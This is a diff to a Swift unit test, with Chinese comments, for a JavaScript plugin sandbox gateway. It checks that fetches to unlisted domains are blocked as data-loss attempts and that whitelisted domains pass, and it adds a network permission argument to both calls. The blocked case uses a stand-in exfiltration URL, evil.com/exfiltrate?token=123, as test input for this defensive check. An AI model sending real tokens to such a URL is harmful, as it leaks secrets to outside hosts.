@@ -82,10 +82,11 @@ final class JavaScriptPluginTests: XCTestCase {
     /// 验证沙盒网关能否防御网络外泄攻击（拦截未授权域名，放行白名单域名）
     func testPluginSandboxGatewayFetchDLP() {
         let allowedDomains = ["api.github.com", "api.openai.com"]
+        let networkPerm = [PluginConstants.Permission.network]
         
         // A. 拦截测试：未授权恶意域名（DLP 拦截）
         XCTAssertThrowsError(
-            try PluginSandboxGateway.auditFetch(url: "https://evil.com/exfiltrate?token=123", options: nil, allowedDomains: allowedDomains),
+            try PluginSandboxGateway.auditFetch(url: "https://evil.com/exfiltrate?token=123", options: nil, allowedDomains: allowedDomains, permissions: networkPerm),
             "访问未授权域名必须抛出拦截错误"
         ) { error in
             // 验证 DLP 域名拦截：应抛出 dlpFetchBlocked case
@@ -98,7 +99,7 @@ final class JavaScriptPluginTests: XCTestCase {
         
         // B. 放行测试：已在 manifest 中注册的白名单域名
         XCTAssertNoThrow(
-            try PluginSandboxGateway.auditFetch(url: "https://api.github.com/repos/wangchong2023/ZhiYu", options: nil, allowedDomains: allowedDomains),
+            try PluginSandboxGateway.auditFetch(url: "https://api.github.com/repos/wangchong2023/ZhiYu", options: nil, allowedDomains: allowedDomains, permissions: networkPerm),
             "访问受信任的白名单域名必须安全放行"
         )
     }
